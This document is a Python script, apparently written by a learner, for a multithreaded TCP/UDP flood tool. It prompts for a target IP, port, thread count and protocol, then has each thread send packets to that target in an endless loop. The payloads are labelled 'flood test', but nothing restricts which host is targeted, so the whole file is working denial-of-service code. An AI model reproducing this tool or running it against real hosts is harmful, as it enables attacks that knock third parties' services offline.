#!/bin/python3


import socket   #fro tcp and udp communication protocol
import threading # allows multiple threads simultanteously

def send_udp_traffic(target_ip, target_port):  #send packet iusing udp protocol
    """Send UDP traffic to the target."""
    message = b"UDP flood test"  # Example payload
    while True:  #ensures continous packet sending 
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #AF_INET Creates an ipv4 sock_dgram a udp protocol
            sock.sendto(message, (target_ip, target_port)) #send paylaod to target ip , port
        except Exception as e:
            print(f"Error in UDP traffic: {e}")

def send_tcp_traffic(target_ip, target_port): #defines the function  target ip and port    """Send TCP traffic to the target."""
    message = b"TCP flood test"  # Example payload 
    while True: #continous packet being sent
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates a tcp protocol
            sock.connect((target_ip, target_port)) #establishes tcp connection
            sock.sendall(message) #sends payload to estbalished connection
            sock.close() #close the socket
        except Exception as e: #for error handling such as network
            print(f"Error in TCP traffic: {e}")

if __name__ == "__main__":  #ensure code runs only when excecuted as script 
    target_ip = input("Enter the target IP: ")
    target_port = int(input("Enter the target port: "))
    threads = int(input("Enter the number of threads: "))
    protocol = input("Enter protocol (TCP/UDP): ").upper()

    for _ in range(threads):
        if protocol == "UDP":
            thread = threading.Thread(target=send_udp_traffic, args=(target_ip, target_port))
        elif protocol == "TCP":
            thread = threading.Thread(target=send_tcp_traffic, args=(target_ip, target_port))
        else:
            print("Invalid protocol. Choose TCP or UDP.")
            break
        thread.start()

